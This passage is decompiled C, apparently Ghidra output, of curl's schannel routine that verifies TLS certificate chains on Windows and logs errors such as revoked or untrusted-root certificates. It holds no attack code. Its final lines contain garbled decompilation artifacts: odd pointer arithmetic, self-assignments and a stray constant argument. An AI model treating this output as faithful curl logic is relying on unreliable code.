          FUN_001d9940(param_2,"schannel: reusing certificate store from cache");
          FUN_0021b2ce(local_160 + 8,0,0x30);
          local_160[8] = 0x30;
          aiStack_118[0] = param_1;
          FUN_00641562(local_160 + 8,local_160 + -1);
          uVar9 = FUN_006f1617(aiStack_118,aiStack_118,0x100);
          uVar9 = FUN_001ca640(uVar9);
          FUN_001d9870(0x2c75c085,"schannel: failed to create certificate chain engine: %s",uVar9);
          uVar9 = 0x4d;
        }
      }
      else {
        FUN_001d9870(param_2,
                     "schannel: this version of Windows is too old to support certificate verification via CA bundle file."
                    );
        uVar9 = 0x4d;
      }
      goto LAB_0020fc71;
    }
    uVar9 = 0;
    uVar8 = 0x20000000;
    local_160[5] = 0;
    local_160[6] = 0;
    local_160[7] = 0;
    if (*(char *)(local_160[3] + 99) != '\0') {
      uVar8 = 0;
    }
    local_160[4] = 0x10;
    iVar5 = FUN_0046e0a9(0,unaff_EBX,unaff_EBP,0,*(undefined4 *)(unaff_EBP + 0x10),local_160 + 4,
                         uVar8,0,local_160 + -3);
    if (iVar5 != 0) {
      uVar7 = 0xfeffffbd;
      if (*(char *)(param_2 + 0x419) == '\0') {
        uVar7 = 0xfffffffd;
      }
      uVar7 = uVar7 & *(uint *)(**(int **)(unaff_ESI + 0x10) + 4);
      if (uVar7 == 0) {
        if (*(char *)(iVar4 + 0x3a) != '\0') {
          uVar9 = FUN_0020fcd0(param_1,param_2);
        }
      }
      else if ((uVar7 & 4) == 0) {
        if ((uVar7 & 0x10000) == 0) {
          if ((uVar7 & 0x20) == 0) {
            if ((uVar7 & 1) == 0) {
              if ((uVar7 & 0x40) == 0) {
                FUN_001d9870(param_2,"schannel: CertGetCertificateChain error mask: 0x%08lx",uVar7);
                uVar9 = 0x3c;
              }
              else {
                FUN_001d9870(param_2,
                             "schannel: CertGetCertificateChain trust error CERT_TRUST_REVOCATION_STATUS_UNKNOWN"
                            );
                uVar9 = 0x3c;
              }
            }
            else {
              FUN_001d9870(param_2,
                           "schannel: CertGetCertificateChain trust error CERT_TRUST_IS_NOT_TIME_VALID"
                          );
              uVar9 = 0x3c;
            }
          }
          else {
            FUN_001d9870(param_2,
                         "schannel: CertGetCertificateChain trust error CERT_TRUST_IS_UNTRUSTED_ROOT"
                        );
            uVar9 = 0x3c;
          }
        }
        else {
          FUN_001d9870(param_2,
                       "schannel: CertGetCertificateChain trust error CERT_TRUST_IS_PARTIAL_CHAIN");
          uVar9 = 0x3c;
        }
      }
      else {
        FUN_001d9870(param_2,"schannel: CertGetCertificateChain trust error CERT_TRUST_IS_REVOKED");
        uVar9 = 0x3c;
      }
      goto LAB_0020fc71;
    }
    uVar9 = FUN_00369dba(param_1,auStack_110,0x100);
    uVar9 = FUN_001ca640(uVar9);
    FUN_001d9870(param_2,"schannel: CertGetCertificateChain failed: %s",uVar9);
    unaff_ESI = 0;
  }
  else {
    uVar9 = FUN_001c9eb0(iVar5,auStack_110,0x100);
    FUN_001d9870(param_2,"schannel: Failed to read remote certificate context: %s",uVar9);
  }
  uVar9 = 0x3c;
LAB_0020fc71:
  if ((unaff_EBX != 0) || (unaff_EBX = local_160[0], local_160[0] != 0)) {
    uVar10 = FUN_006a3c2c(unaff_EBX);
    puVar2 = (undefined1 *)((extraout_ECX_00 ^ *(uint *)(param_1 + -0x7ae3dbbc)) * 2 + 0x6a);
    *puVar2 = *puVar2;
    FUN_01949f0e((int)((ulonglong)uVar10 >> 0x20),(int)uVar10);
  }
  if (unaff_ESI == 0) {
    unaff_ESI = unaff_EBP;
  }
  uVar8 = FUN_0069005e(unaff_ESI);
  pbVar1 = (byte *)(param_1 + -0x7aebdbbc);
  *pbVar1 = *pbVar1 | 0xc0;
  if (*pbVar1 != 0) {
    FUN_0195b722(param_1,uVar8);
  }
  return uVar9;
}
